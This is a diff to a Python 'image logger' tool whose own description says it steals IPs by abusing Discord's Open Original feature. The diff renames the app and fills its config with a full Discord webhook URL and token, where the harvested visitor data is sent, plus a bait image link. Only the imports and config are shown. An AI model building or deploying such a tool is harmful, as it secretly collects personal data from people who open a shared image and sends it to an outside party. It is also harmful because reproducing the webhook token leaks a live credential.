@@ -5,15 +5,15 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
+__app__ = "Vigo Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1363917680641441993/8VKfAuW9O5s_v5jlQ-zNFfid6GSwityldY14row61nTc_njCGmOZ0xtSZsp7d6y9yObF",
+    "image": "https://media.discordapp.net/attachments/1313229770686857380/1380917319332532335/wb9TNCP2_400x400.jpg?ex=68459ef9&is=68444d79&hm=072d77a77372e257112660d7ff5974d47109068e90569c06de9f298d91de0d24&=&format=webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
